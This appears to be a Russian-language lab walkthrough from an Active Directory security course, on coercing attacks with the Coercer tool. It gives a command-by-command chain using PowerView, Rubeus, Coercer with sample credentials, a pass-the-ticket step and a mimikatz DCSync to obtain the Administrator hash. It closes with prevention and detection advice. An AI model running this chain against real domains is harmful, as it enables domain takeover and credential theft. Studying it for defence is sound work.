=====================================================================
* Руководство *
***************

Это пошаговое руководство, цель которой — продемонстрировать проблему, а не подробно описать атаку.

Атака будут выполняться с предоставленных машин Windows 10 (WS001) и Kali Linux.
Предполагается, что злоумышленник уже получил remote code execution (или что-то подобное) на этой машине Windows 10 (WS001).
Пользователь, который, как мы предполагаем, скомпрометирован, — это Боб, обычный пользователь в Active Directory без назначенных специальных разрешений.

Окружение состоит из следующих машин и соответствующих им IP-адресов:

	-	DC1			172.16.18.3
	-	DC2			172.16.18.4
	-	Server01	172.16.18.10
	-	PKI			172.16.18.15
	-	WS001		DHCP или 172.16.18.25 (в зависимости от раздела)
	-	Kali Linux	DHCP или 172.16.18.20 (в зависимости от раздела)

Если надо подключиться к любой из управляющих машин AD сервера (к примеру - DC1)

	i)			Поключаемся к хосту жертвы через RDP
	ii)			Пуск -> Windows Accessories -> Remote Desktop
	iii)		Computer	=	DC1 ip address
				User Name	=	Имя пользователя (к примеру htb-student)
	iv)			Пароль введем позже (будет предоставлен запрос)
	v)			Соглашаемся на устанвку соединения
	
=====================================================================
* Легенда *
***********

Принудительные атаки (Coercing attacks) стали универсальным средством для повышения привилегий от любого пользователя до администратора домена.
Почти каждая организация с инфраструктурой AD по умолчанию уязвима.
Один из вариантов принудительной атаки	-	это использование PrinterBug.
Однако несколько других RPC функций могут выполнять ту же функциональность.
Таким образом, любой пользователь домена может заставить RemoteServer$ пройти аутентификацию на любой машине в домене.
В конечном итоге был разработан инструмент Coercer для одновременного использования всех известных уязвимых функций RPC.

Найти его можно тут	-	https://github.com/p0dalirius/Coercer

Подобно PrinterBug, злоумышленник может выбрать из нескольких представленных ниже вариантов «последующих действий» с обратным подключением:

	1)	Передать подключение на другой контроллер домена и выполнить DCSync (если SMB Signing отключен).

	2)	Заставить контроллер домена подключиться к машине, настроенной для Unconstrained Delegation или UD (неограниченного делегирования) 
		Это кэширует TGT в памяти сервера UD, который можно захватить/экспортировать с помощью таких инструментов, как Rubeus и Mimikatz.

	3)	Ретранслировать соединение в Active Directory Certificate Services для получения сертификата для контроллера домена.
		Агенты угроз могут затем использовать сертификат по требованию для аутентификации и выдавать себя за контроллер домена (например, DCSync).
		
	4)	Ретранслировать соединение для настройки делегирования Kerberos на основе ресурсов для ретранслируемой машины.
		Затем мы можем злоупотребить делегированием для аутентификации в качестве любого администратора на этой машине.

=====================================================================
* Схема атаки *
***************

Мы воспользуемся вторым "последующим действием", предположив, что злоумышленник получил административные права на сервере, настроенном для неограниченного делегирования.
Мы будем использовать этот сервер для захвата TGT, в то время как Coercer будет запущен с машины не состоящей в домене-жертвы.

Чтобы определить системы, настроенные для неограниченного делегирования, мы можем использовать функцию Get-NetComputer из PowerView вместе с переключателем -Unconstrained:
***	Найти PowerView.ps1 можно тут	-	https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

Но сперва, нам надо подключиться к хосту, которые является частью домена НЕ НА ПРЯМУЮ, а через хост-бота (а нашем варианте это Linux машина)

	<bot_host_user_name>@~$ xfreerdp /u:<domain_name>\\<domain_user_name> /p:<password> /v:<domain_user_name_ip> /dynamic-resolution

После подключение через бота к хосту-жертвы (обычного пользователя домена), нам надо определить системы, настроенные для неограниченного делегирования, посредством фукнии Get-NetComputer
***	Если в базед данных комнадлетов жертвы нет комнадлета Get-NetComputer, то спрева придется запустить исполняемый файл PowerView.ps1 (если надо, то включить все необходимые разрешения)

	PS C:\...\...\...> Get-NetComputer -Unconstrained | select samaccountname

	samaccountname
	--------------
	DC1$
	SERVER01$
	WS001$
	DC2$

В результате мы видим, что:

	-	WS001 и SERVER01 доверены для неограниченного делегирования 
	-	DC1 & DC2 доверены по умолчанию

Поэтому либо WS001, либо Server01 будут целью для злоумышленника.
В нашем сценарии мы уже скомпрометировали WS001 и «user_name», у которого есть административные права на этом хосте.

Далее нам надо запустить Rubeus с правами (в режиме) администратора для отслеживания новых входов и извлечения TGT:

	PS C:\...\...\...> .\Rubeus.exe monitor /interval:1

Далее нам нужно узнать IP-адрес WS001, который мы можем получить, запустив ipconfig.

После того, как он станет известен, мы переключимся на машину-бот (в нашем случаем это хост под Kali), чтобы выполнить Coercer по отношению к DC1, в то время как мы заставим его подключиться к WS001, если принуждение будет успешным:

	<bot_host_user_name>@~$ Coercer -u <compromized_user_name> -p <compromized_username_password> -d <domain_name>.local -l <username_hostname>.<domain_name>.local -t <dpmain_controller_name>.eagle.local

							Coercer -u bob -p Slavi123 -d eagle.local -l ws001.eagle.local -t dc1.eagle.local

Теперь, если мы переключимся на WS001 и посмотрим на непрерывный вывод, который предоставляет Rubeus, то должен быть доступен TGT для DC1.
Мы можем использовать этот TGT для аутентификации внутри домена, становясь контроллером домена.
С этого момента DCSync является очевидной атакой (среди прочих).

Один из способов использования вышеупомянутого TGT — через Rubeus, как указано ниже.

	PS C:\...\...\...> .\Rubeus.exe ptt /ticket:doIFdDCCBXCgAwIBBa...SNIP...ndBsLRUFHTEUuTE9DQUw=

	[*] Action: Import Ticket
	[+] Ticket successfully imported!

Желательно убедиться, что TGT был успешно испортирован, проверив через утилиту klist

	PS C:\...\...\...> klist

	Current LogonId is 0:0xf80c3

	Cached Tickets: (1)

	#0>	Client: DC1$ @ EAGLE.LOCAL
		Server: krbtgt/EAGLE.LOCAL @ EAGLE.LOCAL
		KerbTicket Encryption Type: AES-256-CTS-HMAC-SHA1-96
		Ticket Flags 0x60a10000 -> forwardable forwarded renewable pre_authent name_canonicalize 
		Start Time: 2/12/2025 5:10:52 (local)
		End Time:   2/12/2025 15:10:52 (local)
		Renew Time: 2/19/2025 5:10:52 (local)
		Session Key Type: AES-256-CTS-HMAC-SHA1-96
		Cache Flags: 0x1 -> PRIMARY 
		Kdc Called: 

Затем можно выполнить атаку DCSync через mimikatz, по сути, повторив то, что мы сделали в разделе DCSync.

	PS C:\...\...\mimikatz_trunk\x64> .\mimikatz.exe "lsadump::dcsync /domain:<domain_name>.local /user:Administrator"

В результате мы получили NTLM-хэш администратора и можем использовать его для pass-the-hash атаки в дальнейшем

=====================================================================
* Предотвращение/защита *
*************************

Windows не предлагает детальной видимости и контроля над вызовами RPC, чтобы можно было обнаружить, что используется, и заблокировать определенные функции.
Поэтому готового решения для предотвращения этой атаки в настоящее время не существует.

Однако есть два разных общих подхода к предотвращению атак с принуждением:

	1)	Внедрение стороннего брандмауэра RPC, например, из сетей "zero networks" , и его использование для блокировки опасных функций RPC.
		Этот инструмент также предлагает режим аудита, позволяющий отслеживать и получать видимость того, могут ли возникнуть сбои в работе бизнеса из-за его использования или нет.
		Более того, он идет на шаг дальше, предоставляя функциональность блокировки функций RPC, если в запросе присутствует опасный OPNUM, связанный с принуждением.
		(Обратите внимание, что в этом варианте для каждой новой обнаруженной функции RPC в будущем нам придется изменять файл конфигурации брандмауэра, чтобы включить его.)

	2)	Блокировать контроллеры домена и другие серверы базовой инфраструктуры от подключения к исходящим портам 139 и 445, за исключением машин, которые требуются для AD (а также для бизнес-операций).
		Одним из примеров является то, что хотя мы блокируем общий исходящий трафик на порты 139 и 445, мы все равно должны разрешить его для кросс-контроллеров домена
		В противном случае репликация домена не удастся.
		Преимущество этого решения в том, что оно также будет работать против недавно обнаруженных уязвимых функций RPC или других методов принуждения.

=====================================================================
* Обнаружение *
***************

Как уже упоминалось, Windows не предоставляет готового решения для мониторинга активности RPC.
Брандмауэр RPC от "zero networks" является отличным методом обнаружения злоупотребления этими функциями и может указывать на немедленные признаки компрометации
Однако, если мы следуем общим рекомендациям не устанавливать стороннее программное обеспечение на контроллерах домена, то журналы брандмауэра — это наш лучший шанс.

RPC Firewall щт ZeroNetworks можно найти тут	-	https://github.com/zeronetworks/rpcfirewall

Анализ логов брендмауреа от "zero networks" обнаружит успешную  coercing attack с использованием Coercer
В котором машина с адресом^

	xxx.xxx.xxx.128		-	это машина атакующего
	xxx.xxx.xxx.200		-	это  Domain Controller (DC)

В логах мы можем увидить множество входящих подключений к DC, за которыми следуют исходящие подключения от DC к атакующей машине;
Этот процесс повторяется несколько раз, поскольку Coercer выполняет несколько различных функций.
Весь исходящий трафик направляется на порт 445.

Если мы перейдем вперед и заблокируем исходящий трафик на порт 445, то мы увидим следующее поведение:

	Даже если входящее соединение успешно, брандмауэр сбрасывает (DROP) исходящее соединение

Следовательно, злоумышленник не получает никаких принудительных TGT.

Иногда, когда порт 445 заблокирован, машина пытается вместо этого подключиться к порту 139, поэтому рекомендуется блокировать оба порта 139 и 445.

Вышеуказанное также можно использовать для обнаружения, поскольку любой неожиданно сброшенный трафик на порты 139 или 445 является подозрительным.

=====================================================================
* Ловушка/Honeypot *
********************

К сожалению вариантов с ловушкой для данного вида атаки представлено не было